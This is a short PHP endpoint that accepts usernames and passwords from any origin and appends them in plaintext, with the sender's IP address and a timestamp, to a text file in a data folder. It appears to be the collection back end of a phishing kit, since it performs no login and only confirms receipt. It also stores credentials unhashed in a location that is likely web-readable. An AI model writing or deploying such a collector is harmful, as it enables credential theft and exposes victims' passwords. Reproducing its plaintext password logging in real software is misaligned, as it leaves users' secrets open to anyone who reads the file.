<?php
header("Access-Control-Allow-Origin: *"); // Allow CORS for cross-origin requests
header("Content-Type: application/json");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitize input
    $username = htmlspecialchars(trim($_POST["username"] ?? ""), ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars(trim($_POST["password"] ?? ""), ENT_QUOTES, 'UTF-8');
    
    // Log data to file
    $data = "Received - Username: $username, Password: $password, IP: " . $_SERVER["REMOTE_ADDR"] . ", Time: " . date("Y-m-d H:i:s") . "\n";
    $logFile = "data/received_data.txt";
    if (!is_dir('data')) {
        mkdir('data', 0755, true);
    }
    file_put_contents($logFile, $data, FILE_APPEND | LOCK_EX);
    
    // Return success response
    echo json_encode(["status" => "success", "message" => "Data received successfully"]);
} else {
    http_response_code(405);
    echo json_encode(["status" => "error", "message" => "Method not allowed"]);
}
?>
